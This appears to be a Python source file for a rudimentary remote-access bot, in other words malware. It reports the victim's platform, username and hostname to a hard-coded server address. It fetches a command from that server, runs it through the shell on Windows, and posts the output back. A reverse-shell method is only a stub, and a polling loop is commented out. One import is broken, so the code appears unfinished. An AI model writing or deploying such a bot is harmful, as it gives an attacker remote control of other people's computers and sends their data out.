from datetime import datetime
import time
import uuid
import random
import sockets
import requests
import platform
import os
from subprocess import check_output

    
class Bot(object):
    

    def __init__(self):
        self.platform = platform.system()
        self.uid = "2315"
        self.username = self.curr_user()
        self.hostname = "end again"

    def curr_user(self):
        user = os.popen('whoami').read()
        user = user.split("\\", 1)[-1]
        return user

    def reverse_shell(self):
        print("end")

    def ping_server(self):
        send = {
                    'platform': str(self.platform),
                    'hostname': self.hostname,
                    'username': self.username
                }
        print(send['platform'])
        r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/status', json=send)
        return r.text

    def send_output(self, output):
        r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/report', data= {'output':output})

    def run_command(self,command):
        if self.platform == "Windows":
            out = check_output(command, shell=True).decode()
            print(out)
            self.send_output(out)

    def run(self):
        job = self.ping_server()
        print(job)
        self.run_command(job)

        """
        start = time.time()
        while True:
            job = self.ping_server()




            time.sleep(60.0 - ((time.time() - start) % 60.0))


        print(self.ping_server())
        """

       
def main():
    bot = Bot()
    bot.run()
if __name__ == "__main__":
    main()
